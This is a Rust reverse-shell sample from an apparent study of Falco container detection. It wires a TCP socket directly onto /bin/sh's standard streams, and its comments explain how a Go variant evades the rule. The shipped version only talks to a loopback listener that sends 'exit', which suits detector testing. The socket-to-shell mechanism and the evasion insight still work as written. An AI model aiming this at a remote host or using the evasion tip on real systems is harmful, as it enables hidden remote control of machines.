//! reverse_shell composite (ATT&CK T1059) -- stdio-over-socket.
//!
//! The idiomatic native reverse shell, and THE substrate mover for this study:
//! open a TCP socket and put it DIRECTLY onto the shell's stdin/stdout/stderr,
//! then exec /bin/sh. Falco's container rule "Redirect STDOUT/STDIN to Network
//! Connection in Container" keys on a dup of a socket fd (fd.type in ipv4/ipv6)
//! onto fd 0/1/2, so C/C++/Rust -- which dup the socket itself onto stdio --
//! FIRE. The Go build of this composite uses os/exec, whose net.Conn is not an
//! *os.File, so it pipe-relays (fd.type=fifo) and EVADES: same behaviour,
//! different runtime I/O model, different fd.type. That contrast is the
//! mechanism-keyed fragility result.
//!
//! Here the socket lands on stdio via std alone: `TcpStream: Into<OwnedFd>` and
//! `OwnedFd: Into<Stdio>` are both stable std conversions, and each
//! `try_clone()` dups the underlying socket fd. Command wires those dup'd socket
//! fds onto fd 0/1/2 -- exactly the C `dup2(s, 0/1/2)` mechanism, no libc.
//!
//! Self-contained, benign, deterministic: a loopback listener thread on
//! 127.0.0.1:4444 accepts the shell's connection, sends "exit\n", then
//! half-closes (shutdown(Write)) so the shell reads EOF and runs only the `exit`
//! builtin -- no external network, no real command execution. Detonates in a
//! container.

use std::io::{Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::os::fd::OwnedFd;
use std::process::{Command, Stdio};
use std::thread;

const ADDR: &str = "127.0.0.1:4444";

fn main() {
    // Bind the loopback listener before dialing so accept() is ready and there
    // is no bind/connect race.
    let listener = match TcpListener::bind(ADDR) {
        Ok(l) => l,
        Err(_) => return,
    };

    // Listener thread: drive the shell to exit, then let it EOF and close.
    let handle = thread::spawn(move || {
        if let Ok((mut client, _)) = listener.accept() {
            // Tell the shell to terminate.
            let _ = client.write_all(b"exit\n");
            // Half-close our write side so the shell's stdin reads EOF and the
            // `exit` builtin runs; without this the shell would block on read.
            let _ = client.shutdown(Shutdown::Write);
            // Drain the shell's output until it closes its end.
            let mut buf = [0u8; 64];
            while let Ok(n) = client.read(&mut buf) {
                if n == 0 {
                    break;
                }
            }
            // client dropped here -> connection closed.
        }
    });

    // Dial the listener; this socket becomes the shell's stdio.
    let sock = match TcpStream::connect(ADDR) {
        Ok(s) => s,
        Err(_) => {
            let _ = handle.join();
            return;
        }
    };

    // Each try_clone() dups the socket fd; Stdio::from(OwnedFd) wires the dup'd
    // socket onto the child's stdin/stdout/stderr (fd.type=ipv4) -- the C dup2.
    let s0 = match sock.try_clone() {
        Ok(s) => s,
        Err(_) => return,
    };
    let s1 = match sock.try_clone() {
        Ok(s) => s,
        Err(_) => return,
    };

    let child = Command::new("/bin/sh")
        .stdin(Stdio::from(OwnedFd::from(s0)))
        .stdout(Stdio::from(OwnedFd::from(s1)))
        .stderr(Stdio::from(OwnedFd::from(sock)))
        .spawn();

    match child {
        Ok(mut c) => {
            let _ = c.wait();
        }
        Err(_) => {}
    }

    let _ = handle.join();
}
